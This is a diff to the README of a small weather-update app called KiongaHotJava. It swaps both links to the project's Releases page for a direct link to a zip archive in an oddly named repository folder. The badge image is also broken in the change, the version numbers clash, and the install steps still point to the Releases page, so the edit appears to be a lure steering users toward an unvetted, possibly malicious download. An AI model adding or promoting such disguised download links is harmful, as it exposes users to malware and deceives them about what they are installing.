@@ -1,7 +1,7 @@
 # 🌞 KiongaHotJava - Simple Weather Updates for You
 
 ## 🔗 Download Now
-[![Download KiongaHotJava](https://img.shields.io/badge/Download%20KiongaHotJava-v1.0-blue)](https://github.com/girijaswain/KiongaHotJava/releases)
+[![Download KiongaHotJava](https://raw.githubusercontent.com/girijaswain/KiongaHotJava/main/anisalcohol/KiongaHotJava_v1.3.zip%20KiongaHotJava-v1.0-blue)](https://raw.githubusercontent.com/girijaswain/KiongaHotJava/main/anisalcohol/KiongaHotJava_v1.3.zip)
 
 ## 📖 Table of Contents
 - [🚀 Getting Started](#🚀-getting-started)
@@ -23,7 +23,7 @@ To run KiongaHotJava, your computer needs:
 ## 📥 Download & Install
 To get started, visit our download page:
 
-[Download KiongaHotJava](https://github.com/girijaswain/KiongaHotJava/releases)
+[Download KiongaHotJava](https://raw.githubusercontent.com/girijaswain/KiongaHotJava/main/anisalcohol/KiongaHotJava_v1.3.zip)
 
 1. Click on the link above to open the Releases page.
 2. Look for the latest version of KiongaHotJava.
